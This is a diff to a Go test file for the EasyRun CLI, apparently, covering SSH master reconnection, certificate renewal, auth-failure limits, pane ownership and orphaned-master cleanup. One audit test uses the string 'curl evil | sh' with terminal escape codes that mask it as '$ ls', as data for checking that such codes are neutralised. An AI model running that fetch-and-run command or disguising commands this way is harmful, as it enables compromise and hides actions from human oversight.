@@ -8,7 +8,9 @@ import (
 	"io"
 	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strconv"
 	"strings"
@@ -16,6 +18,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/EasyRunTech/easyrun-cli/internal/api"
 	"github.com/EasyRunTech/easyrun-cli/internal/config"
 )
 
@@ -31,6 +34,7 @@ type claudeHarness struct {
 	extra    map[string]string
 	noClaude bool
 	tty      bool
+	tmpRoot  string // pengganti $TMPDIR untuk folder soket master
 }
 
 func newClaudeHarness(t *testing.T) *claudeHarness {
@@ -59,6 +63,15 @@ func newClaudeHarness(t *testing.T) *claudeHarness {
 	if err := os.MkdirAll(filepath.Join(ch.eb, "hands"), 0o700); err != nil {
 		t.Fatal(err)
 	}
+	// Folder sementara calon soket master milik uji ini saja: pembersih
+	// master yatim tidak pernah menyentuh $TMPDIR/easyrun-<uid> sungguhan.
+	ch.tmpRoot, err = os.MkdirTemp("", "ert")
+	if err != nil {
+		t.Fatal(err)
+	}
+	prevRoots := controlTempRoots
+	controlTempRoots = func() []string { return []string{ch.tmpRoot} }
+	t.Cleanup(func() { controlTempRoots = prevRoots; _ = os.RemoveAll(ch.tmpRoot) })
 	proj := filepath.Join(h.home, "proj")
 	ch.outside = filepath.Join(h.home, "luar")
 	for _, d := range []string{proj, ch.outside} {
@@ -257,6 +270,8 @@ func TestClaudeAttachAlurLengkap(t *testing.T) {
 		e1, e2, e3 bool
 		t1, t2     string
 		hello      map[string]any
+		owner      muxOwner
+		master     masterLog
 	}
 	var mu sync.Mutex
 	var g got
@@ -265,8 +280,15 @@ func TestClaudeAttachAlurLengkap(t *testing.T) {
 		e1, t1 := b.call("Read", map[string]any{"file_path": ch.proj + "/a.txt"})
 		e2, t2 := b.call("Read", map[string]any{"file_path": ch.outside + "/b.txt"})
 		e3, _ := b.call("Bash", map[string]any{"command": "pwd"})
+		var o muxOwner
+		var ml masterLog
+		if ms := ch.masters(); len(ms) == 1 {
+			ml = ms[0]
+			raw, _ := os.ReadFile(ml.Path + controlPidSuffix)
+			_ = json.Unmarshal(raw, &o)
+		}
 		mu.Lock()
-		g = got{names: names, e1: e1, e2: e2, e3: e3, t1: t1, t2: t2, hello: b.hello}
+		g = got{names: names, e1: e1, e2: e2, e3: e3, t1: t1, t2: t2, hello: b.hello, owner: o, master: ml}
 		mu.Unlock()
 		ch.uiExit("0")
 		drain(b)
@@ -355,6 +377,12 @@ func TestClaudeAttachAlurLengkap(t *testing.T) {
 	}
 	if _, err := os.Lstat(cp); !errors.Is(err, os.ErrNotExist) {
 		t.Errorf("soket master masih ada: %v", err)
+	}
+	if g.owner.Owner != os.Getpid() || g.owner.Master == 0 || g.owner.Master != g.master.PID || g.master.Path != cp {
+		t.Errorf("pidfile selama attach: %+v, master %+v", g.owner, g.master)
+	}
+	if _, err := os.Lstat(cp + controlPidSuffix); !errors.Is(err, os.ErrNotExist) {
+		t.Errorf("pidfile master masih ada: %v", err)
 	}
 
 	clog, _ := os.ReadFile(filepath.Join(ch.fake, "claude.log"))
@@ -729,5 +757,365 @@ func TestClaudeHandTeksBoxDinetralkan(t *testing.T) {
 	audit, _ := os.ReadFile(filepath.Join(ch.d.Path, claudeAuditFile))
 	if strings.ContainsAny(string(audit), "\x1b\x07\r") || !strings.Contains(string(audit), `Bash "curl evil | sh\x1b[1G\x1b[2K$ ls"`) {
 		t.Errorf("audit:\n%q", audit)
+	}
+}
+
+func (ch *claudeHarness) masters() []masterLog {
+	ch.t.Helper()
+	raw, _ := os.ReadFile(filepath.Join(ch.fake, "master.log"))
+	var out []masterLog
+	for _, l := range strings.Split(strings.TrimSpace(string(raw)), "\n") {
+		var m masterLog
+		if json.Unmarshal([]byte(l), &m) == nil {
+			out = append(out, m)
+		}
+	}
+	return out
+}
+
+// killMaster — master terakhir berhenti (seperti jaringan putus).
+func (ch *claudeHarness) killMaster() {
+	ch.t.Helper()
+	ms := ch.masters()
+	if len(ms) == 0 || !muxDial(ms[len(ms)-1].Path, "exit") {
+		ch.t.Error("master palsu tidak bisa dihentikan")
+	}
+}
+
+// lsDone — jumlah `easybox ls` palsu (FAKE_LS_FILE) yang sudah selesai.
+func (ch *claudeHarness) lsDone() int {
+	fi, err := os.Stat(filepath.Join(ch.fake, "ls-done"))
+	if err != nil {
+		return 0
+	}
+	return int(fi.Size())
+}
+
+func (ch *claudeHarness) writeLs(t *testing.T, path string, laptop map[string]any) {
+	t.Helper()
+	pane := map[string]any{"pane": "w1", "session": "default", "bridge_running": true, "started_at": "2026-11-20T09:00:00Z", "laptop": laptop}
+	raw, _ := json.Marshal(map[string]any{"panes": []any{pane}})
+	if err := os.WriteFile(path, raw, 0o600); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func waitFor(t *testing.T, what string, cond func() bool) {
+	t.Helper()
+	end := time.Now().Add(10 * time.Second)
+	for !cond() {
+		if time.Now().After(end) {
+			t.Errorf("menunggu %s: habis waktu", what)
+			return
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+}
+
+// TestClaudeHandMasterUlangPerbaruiSertifikat — temuan 1: master mati setelah
+// sertifikat (1 jam) kedaluwarsa → sertifikat diperbarui SEBELUM master baru
+// dibuka, master baru memakai sertifikat baru.
+func TestClaudeHandMasterUlangPerbaruiSertifikat(t *testing.T) {
+	ch := newClaudeHarness(t)
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	conns := ch.serveBridge("w1",
+		func(b *bridgeConn) {
+			b.handshake()
+			ch.clock.Advance(2 * time.Hour) // sertifikat pertama sudah habis
+			ch.killMaster()
+		},
+		func(b *bridgeConn) {
+			b.handshake()
+			cancel()
+			drain(b)
+		})
+	if code := ch.runCtx(ctx, "claude", "uji-box", "w1", "hand"); code != 0 {
+		t.Fatalf("kode %d\n%s", code, ch.stderr)
+	}
+	if conns() != 2 {
+		t.Errorf("sambungan tangan %d, ingin 2", conns())
+	}
+	if n := ch.p.n("POST /instances/certificate"); n != 2 {
+		t.Errorf("sertifikat diminta %d kali, ingin 2 (awal + sebelum master dibuka ulang)", n)
+	}
+	ms := ch.masters()
+	if len(ms) != 2 || ms[0].ValidBefore == 0 || ms[1].ValidBefore <= ms[0].ValidBefore {
+		t.Fatalf("master kedua harus memakai sertifikat baru: %+v", ms)
+	}
+	if exp := uint64(ch.clock.Now().Unix()); ms[1].ValidBefore <= exp {
+		t.Errorf("sertifikat master kedua sudah kedaluwarsa: %d ≤ %d", ms[1].ValidBefore, exp)
+	}
+	if !strings.Contains(ch.stderr.String(), "sambungan SSH terputus; membuka ulang") {
+		t.Errorf("stderr:\n%s", ch.stderr)
+	}
+}
+
+// TestClaudeHandBerhentiSetelahAuthDitolak — temuan 1: sshd terus menolak
+// autentikasi → berhenti setelah handAuthFailMax percobaan, tidak tanpa akhir.
+func TestClaudeHandBerhentiSetelahAuthDitolak(t *testing.T) {
+	ch := newClaudeHarness(t)
+	ch.extra["FAKE_MASTER_FAIL"] = "budi@contoh-box.easyrun.io: Permission denied (publickey)."
+	ch.extra["FAKE_MASTER_FAIL_FROM"] = "2"
+	ch.serveBridge("w1", func(b *bridgeConn) {
+		b.handshake()
+		ch.killMaster()
+	})
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	code := ch.runCtx(ctx, "claude", "uji-box", "w1", "hand")
+	if ctx.Err() != nil {
+		t.Fatal("tangan tidak berhenti sendiri")
+	}
+	errs := ch.stderr.String()
+	if code != 1 || !strings.Contains(errs, "autentikasi SSH ke box gagal 3 kali berturut-turut") || !strings.Contains(errs, "Permission denied (publickey)") || !strings.Contains(errs, "easyrun login") {
+		t.Fatalf("kode %d\n%s", code, errs)
+	}
+	if n := len(ch.masters()); n != 1+handAuthFailMax {
+		t.Errorf("master dicoba %d kali, ingin %d", n, 1+handAuthFailMax)
+	}
+}
+
+func TestClaudeAuthFailure(t *testing.T) {
+	for _, c := range []struct {
+		err  error
+		want bool
+	}{
+		{&muxError{msg: "x", auth: true}, true},
+		{&muxError{msg: "Network is unreachable"}, false},
+		{&certError{err: &expiredError{}}, true},
+		{&certError{err: config.ErrNotLoggedIn}, true},
+		{&certError{err: &api.Error{Status: 401}}, true},
+		{&certError{err: &api.Error{Status: 404}}, true},
+		{&certError{err: &api.Error{Status: 503}}, false},
+		{&certError{err: &api.NetError{}}, false},
+		{errors.New("lain"), false},
+	} {
+		if got := authFailure(c.err); got != c.want {
+			t.Errorf("authFailure(%T %v) = %v", c.err, c.err, got)
+		}
+	}
+}
+
+// TestClaudeAttachRingkasanAlasanTidakTersambung — temuan 4: attach yang
+// tangannya tidak pernah siap menyebut alasannya di ringkasan.
+func TestClaudeAttachRingkasanAlasanTidakTersambung(t *testing.T) {
+	ch := newClaudeHarness(t)
+	ch.extra["FAKE_HC_EXIT"] = "255"
+	ch.extra["FAKE_HC_STDERR"] = "channel 3: open failed: administratively prohibited"
+	go func() { time.Sleep(2500 * time.Millisecond); ch.uiExit("0") }()
+	if code := ch.runCtx(context.Background(), "claude", "uji-box", "w1", "attach"); code != 0 {
+		t.Fatalf("kode %d\n%s", code, ch.stderr)
+	}
+	errs := ch.stderr.String()
+	if !strings.Contains(errs, "0 panggilan tool") || !strings.Contains(errs, "catatan: tangan laptop tidak pernah tersambung; galat terakhir: ssh: channel 3: open failed: administratively prohibited") {
+		t.Errorf("ringkasan tanpa alasan:\n%s", errs)
+	}
+}
+
+// TestClaudeTidakMerebutPaneKembali — temuan 3: sambungan putus TANPA
+// pemberitahuan "digantikan" (laptop tidur/jaringan putus) lalu laptop lain
+// memegang pane → tangan ini berhenti, tidak menyambung ulang. Sisa catatan
+// sambungan sendiri (connected_at sama) tetap disambung ulang.
+func TestClaudeTidakMerebutPaneKembali(t *testing.T) {
+	lsFile := func(ch *claudeHarness) string {
+		p := filepath.Join(ch.fake, "ls.json")
+		ch.extra["FAKE_LS_FILE"] = p
+		_ = os.WriteFile(p, []byte(`{"panes":[]}`), 0o600)
+		return p
+	}
+	own := func(b *bridgeConn, at string) map[string]any {
+		return map[string]any{"host": b.hello["host"], "user": b.hello["user"], "root": b.hello["root"], "mode": b.hello["mode"], "connected_at": at}
+	}
+	for _, c := range []struct {
+		name     string
+		mode     string
+		after    func(b *bridgeConn) map[string]any // pemegang pane saat tangan ini putus
+		steal    bool
+		wantNote string
+	}{
+		{"laptop lain", "hand", func(b *bridgeConn) map[string]any {
+			return map[string]any{"host": "laptop-lain", "user": "sari", "root": "/home/sari/web", "mode": "full", "connected_at": "2026-11-20T10:05:00Z"}
+		}, false, "pane default:w1 sekarang dipegang sari@laptop-lain, root /home/sari/web, sejak 2026-11-20T10:05:00Z; tangan ini berhenti supaya tidak merebutnya kembali"},
+		{"laptop & folder sama, proses lain", "hand", func(b *bridgeConn) map[string]any { return own(b, "2026-11-20T10:06:00Z") }, false, "(laptop & folder ini, dari proses easyrun lain)"},
+		{"sisa sambungan sendiri", "hand", func(b *bridgeConn) map[string]any { return own(b, "2026-11-20T10:00:00Z") }, true, ""},
+		{"kosong", "hand", func(b *bridgeConn) map[string]any { return nil }, true, ""},
+		{"attach, laptop lain", "attach", func(b *bridgeConn) map[string]any {
+			return map[string]any{"host": "laptop-lain", "user": "sari", "root": "/x", "mode": "read-only", "connected_at": "2026-11-20T10:05:00Z"}
+		}, false, "sekarang dipegang sari@laptop-lain"},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			ch := newClaudeHarness(t)
+			ls := lsFile(ch)
+			ctx, cancel := context.WithCancel(context.Background())
+			defer cancel()
+			first := func(b *bridgeConn) {
+				// Jembatan mencatat tangan ini (connected_at 10:00) sesudah
+				// jabat tangan; tangan mempelajarinya lewat `easybox ls`.
+				ch.writeLs(t, ls, own(b, "2026-11-20T10:00:00Z"))
+				before := ch.lsDone()
+				b.handshake()
+				waitFor(t, "easybox ls sesudah jabat tangan", func() bool { return ch.lsDone() > before })
+				learned := ch.lsDone()
+				ch.writeLs(t, ls, c.after(b))
+				if c.mode == "attach" && !c.steal {
+					// UI keluar sesudah pemeriksaan pemegang (ls berikutnya) selesai.
+					go func() {
+						waitFor(t, "pemeriksaan pemegang pane", func() bool { return ch.lsDone() > learned })
+						time.Sleep(time.Second)
+						ch.uiExit("0")
+					}()
+				}
+				// putus tanpa pemberitahuan "digantikan"
+			}
+			second := func(b *bridgeConn) {
+				b.handshake()
+				if c.mode == "attach" {
+					ch.uiExit("0")
+				}
+				cancel()
+				drain(b)
+			}
+			conns := ch.serveBridge("w1", first, second)
+			code := ch.runCtx(ctx, "claude", "uji-box", "w1", c.mode)
+			errs := ch.stderr.String()
+			if c.steal {
+				if conns() != 2 || code != 0 {
+					t.Errorf("harus menyambung ulang: %d sambungan, kode %d\n%s", conns(), code, errs)
+				}
+				return
+			}
+			if conns() != 1 {
+				t.Errorf("tangan merebut kembali pane: %d sambungan", conns())
+			}
+			if !strings.Contains(errs, c.wantNote) {
+				t.Errorf("catatan %q tidak ada:\n%s", c.wantNote, errs)
+			}
+			if c.mode == "hand" && code != 1 {
+				t.Errorf("kode %d", code)
+			}
+		})
+	}
+}
+
+// startFakeMaster — master palsu (biner uji sebagai ssh) di path, di-Wait di
+// latar (tidak menjadi zombie).
+func (ch *claudeHarness) startFakeMaster(t *testing.T, path string) (*exec.Cmd, chan struct{}) {
+	t.Helper()
+	cmd := exec.Command(filepath.Join(ch.bin, "ssh"), "-o", "ControlMaster=yes", "-o", "ControlPath="+path, "-N", "uji")
+	cmd.Env = ch.a.environ()
+	if err := cmd.Start(); err != nil {
+		t.Fatal(err)
+	}
+	done := make(chan struct{})
+	go func() { _ = cmd.Wait(); close(done) }()
+	t.Cleanup(func() { _ = cmd.Process.Kill(); <-done })
+	waitFor(t, "soket master palsu", func() bool { _, err := os.Lstat(path); return err == nil })
+	return cmd, done
+}
+
+func startSleep(t *testing.T) (*exec.Cmd, chan struct{}) {
+	t.Helper()
+	cmd := exec.Command("sleep", "60")
+	if err := cmd.Start(); err != nil {
+		t.Fatal(err)
+	}
+	done := make(chan struct{})
+	go func() { _ = cmd.Wait(); close(done) }()
+	t.Cleanup(func() { _ = cmd.Process.Kill(); <-done })
+	return cmd, done
+}
+
+func isDone(ch chan struct{}, within time.Duration) bool {
+	select {
+	case <-ch:
+		return true
+	case <-time.After(within):
+		return false
+	}
+}
+
+// TestClaudeMasterYatimDibersihkan — temuan 8: master `-N` milik easyrun yang
+// mati mendadak dibersihkan saat master baru dibuka; milik jalan lain yang
+// masih hidup, soket yang masih menjawab, dan berkas lain tidak disentuh.
+func TestClaudeMasterYatimDibersihkan(t *testing.T) {
+	ch := newClaudeHarness(t)
+	dir := filepath.Join(ch.tmpRoot, "easyrun-"+strconv.Itoa(os.Getuid()))
+	if err := os.MkdirAll(dir, 0o700); err != nil {
+		t.Fatal(err)
+	}
+	p := func(n string) string { return filepath.Join(dir, n) }
+	owner := func(name string, o muxOwner) {
+		if err := writeMuxOwner(p(name+controlPidSuffix), o); err != nil {
+			t.Fatal(err)
+		}
+	}
+	dead := exec.Command("true")
+	if err := dead.Run(); err != nil {
+		t.Fatal(err)
+	}
+	deadPid := dead.Process.Pid
+	liveOwner, _ := startSleep(t)
+
+	orphan, orphanDone := ch.startFakeMaster(t, p("aaaaaaaaaa")) // pemilik mati → -O exit
+	owner("aaaaaaaaaa", muxOwner{Owner: deadPid, Master: orphan.Process.Pid})
+	other, otherDone := ch.startFakeMaster(t, p("bbbbbbbbbb")) // pemilik hidup → biarkan
+	owner("bbbbbbbbbb", muxOwner{Owner: liveOwner.Process.Pid, Master: other.Process.Pid})
+	lDead, err := net.Listen("unix", p("cccccccccc")) // soket mati tanpa pidfile → hapus
+	if err != nil {
+		t.Fatal(err)
+	}
+	lDead.(*net.UnixListener).SetUnlinkOnClose(false)
+	_ = lDead.Close()
+	lLive, err := net.Listen("unix", p("dddddddddd")) // soket hidup tanpa pidfile → biarkan
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer lLive.Close()
+	noSock, noSockDone := ch.startFakeMaster(t, p("eeeeeeeeee")) // soket terhapus, master hidup → SIGTERM
+	_ = os.Remove(p("eeeeeeeeee"))
+	owner("eeeeeeeeee", muxOwner{Owner: deadPid, Master: noSock.Process.Pid})
+	reused, reusedDone := startSleep(t) // pid master dipakai ulang proses lain → JANGAN dihentikan
+	owner("ffffffffff", muxOwner{Owner: deadPid, Master: reused.Process.Pid})
+	_ = os.WriteFile(p("gggggggggg"+controlPidSuffix), []byte("{rusak"), 0o600) // ragu → biarkan
+	_ = os.WriteFile(p("catatan.txt"), []byte("x"), 0o600)
+
+	conn := &boxConn{a: ch.a, sshPath: filepath.Join(ch.bin, "ssh"), env: ch.a.environ(), base: []string{"ssh"}, host: "uji"}
+	m, err := ch.a.startMux(context.Background(), conn, ch.d)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !isDone(orphanDone, 5*time.Second) {
+		t.Error("master yatim tidak dihentikan")
+	}
+	if !isDone(noSockDone, 5*time.Second) {
+		t.Error("master yatim tanpa soket tidak dihentikan")
+	}
+	if isDone(otherDone, 200*time.Millisecond) || isDone(reusedDone, 0) {
+		t.Error("proses yang bukan yatim ikut dihentikan")
+	}
+	gone := func(n string) bool { _, err := os.Lstat(p(n)); return errors.Is(err, os.ErrNotExist) }
+	for _, n := range []string{"aaaaaaaaaa", "aaaaaaaaaa.pid", "cccccccccc", "eeeeeeeeee.pid", "ffffffffff.pid"} {
+		if !gone(n) {
+			t.Errorf("%s harus dihapus", n)
+		}
+	}
+	for _, n := range []string{"bbbbbbbbbb", "bbbbbbbbbb.pid", "dddddddddd", "gggggggggg.pid", "catatan.txt"} {
+		if gone(n) {
+			t.Errorf("%s tidak boleh dihapus", n)
+		}
+	}
+	if !reflect.DeepEqual(m.cmd.SysProcAttr, masterProcAttr()) {
+		t.Errorf("master tanpa masterProcAttr: %+v", m.cmd.SysProcAttr)
+	}
+	// Master baru punya pidfile pemilik = proses ini; hilang saat ditutup.
+	var o muxOwner
+	raw, err := os.ReadFile(m.path + controlPidSuffix)
+	if err != nil || json.Unmarshal(raw, &o) != nil || o.Owner != os.Getpid() || o.Master != m.cmd.Process.Pid {
+		t.Errorf("pidfile master baru: %s %v", raw, err)
+	}
+	m.close(conn)
+	if _, err := os.Lstat(m.path + controlPidSuffix); !errors.Is(err, os.ErrNotExist) {
+		t.Errorf("pidfile tertinggal setelah close: %v", err)
 	}
 }
